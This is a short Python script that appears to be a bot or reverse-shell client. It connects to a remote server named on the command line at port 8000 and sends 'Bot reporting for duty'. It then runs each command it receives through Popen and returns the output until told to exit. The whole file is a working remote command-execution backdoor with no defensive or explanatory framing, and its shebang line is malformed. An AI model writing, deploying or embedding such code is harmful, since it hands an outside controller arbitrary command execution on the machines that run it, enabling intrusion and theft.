#!bash/python

import sys
import os
from base64 import encode
from concurrent.futures import process
from subprocess import Popen, PIPE
from socket import *
from unittest import result

serverName = sys.argv[1]
serverPort = 8000

clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName, serverPort))
clientSocket.send('Bot reporting for duty'.encode())
command = clientSocket.recv(4064).decode()
while command != "exit":
    process = Popen(command.split(" "), stdout=PIPE)
    result, error = process.communicate()
    clientSocket.send(result)
    command = (clientSocket.recv(4064)).decode()

clientSocket.close()